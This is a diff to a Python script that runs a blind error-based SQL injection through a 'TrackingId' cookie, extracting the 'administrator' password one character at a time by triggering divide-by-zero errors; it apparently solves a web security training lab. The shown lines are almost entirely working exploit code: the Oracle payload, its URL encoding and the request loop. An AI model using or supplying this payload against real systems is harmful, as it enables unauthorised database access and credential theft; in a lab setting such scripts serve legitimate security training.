@@ -16,7 +16,7 @@ def injection(url):
         for j in range (32,126): # range of all characters ASCII number
             payload="' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
             payload_encoded= urllib.parse.quote(payload)
-            cookies = {'TrackingId':'junk' + payload_encoded,'session':f'{session}'}
+            cookies = {'TrackingId':'junk' + payload_encoded,'session':'junk'}
             r = requests.get(url, cookies=cookies, verify=False)
             
             if "Internal Server Error" not in r.text:
@@ -35,7 +35,7 @@ def injection(url):
 def main(url):
     print(f"[+] Retrieving Admin's Password...")
     
-    injection(url,session)
+    injection(url)
     
 if __name__=="__main__":
     try:
